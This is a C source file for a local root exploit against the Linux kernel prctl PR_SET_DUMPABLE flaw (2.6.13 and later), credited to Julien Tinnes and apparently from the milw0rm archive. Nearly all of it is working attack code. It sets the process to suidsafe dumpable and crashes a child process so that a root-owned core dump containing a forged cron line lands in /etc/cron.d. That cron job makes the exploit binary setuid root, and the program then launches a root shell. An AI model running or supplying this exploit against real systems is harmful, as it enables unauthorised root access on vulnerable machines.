/* Linux >= 2.6.13 prctl kernel exploit
 *
 * (C) Julien TINNES
 *
 * If you read the Changelog from 2.6.13 you've probably seen:
 *  [PATCH] setuid core dump
 * 
 * This patch mainly adds suidsafe to suid_dumpable sysctl but also a new per process,
 * user setable argument to PR_SET_DUMPABLE.
 * 
 * This flaw allows us to create a root owned coredump into any directory.
 * This is trivially exploitable.
 *
 */

#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <time.h>

#define CROND "/etc/cron.d"
#define BUFSIZE 2048


struct rlimit myrlimit={RLIM_INFINITY, RLIM_INFINITY};

char	crontemplate[]=
"#/etc/cron.d/core suid_dumpable exploit\n"
"SHELL=/bin/sh\n"
"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
"#%s* * * * *	root	 chown root:root %s && chmod 4755 %s && rm -rf %s && kill -USR1 %d\n";

char	cronstring[BUFSIZE];
char	fname[BUFSIZE];

struct timeval te;

void sh(int sn) {
	execl(fname, fname, (char *) NULL);
}
	

int	main(int argc, char *argv[]) {

	int nw, pid;

	if (geteuid() == 0) {
		printf("[+] getting root shell\n");
		setuid(0);
		setgid(0);
		if (execl("/bin/sh", "/bin/sh", (char *) NULL)) {
			perror("[-] execle");
			return 1;
		}
	}

	printf("\nprctl() suidsafe exploit\n\n(C) Julien TINNES\n\n");

	/* get our file name */
	if (readlink("/proc/self/exe", fname, sizeof(fname)) == -1) {
		perror("[-] readlink");
		printf("This is not fatal, rewrite the exploit\n");
	}

	if (signal(SIGUSR1, sh) == SIG_ERR) {
		perror("[-] signal");
		return 1;
	}
	printf("[+] Installed signal handler\n");

	/* Let us create core files */
	setrlimit(RLIMIT_CORE, &myrlimit);
	if (chdir(CROND) == -1) {
		perror("[-] chdir");
		return 1;
	}

	/* exploit the flaw */
	if (prctl(PR_SET_DUMPABLE, 2) == -1) {
		perror("[-] prtctl");
		printf("Is you kernel version >= 2.6.13 ?\n");
		return 1;
	}

	printf("[+] We are suidsafe dumpable!\n");

	/* Forge the string for our core dump */
	nw=snprintf(cronstring, sizeof(cronstring), crontemplate, "\n", fname, fname, CROND"/core", getpid());
	if (nw >= sizeof(cronstring)) {
		printf("[-] cronstring is too small\n");
		return 1;
	}
	printf("[+] Malicious string forged\n");

	if ((pid=fork()) == -1) {
		perror("[-] fork");
		return 1;
	}

	if (pid == 0) {
		/* This is not the good way to do it ;) */
		sleep(120);
		exit(0);
	}

	/* SEGFAULT the child */
	printf("[+] Segfaulting child\n");
	if (kill(pid, 11) == -1) {
		perror("[-] kill");
		return 1;
	}
	if (gettimeofday(&te, NULL) == 0) 
		printf("[+] Waiting for exploit to succeed (~%ld seconds)\n", 60 - (te.tv_sec%60));
	sleep(120);

	printf("[-] It looks like the exploit failed\n");

	return 1;
}

// milw0rm.com [2006-07-12]

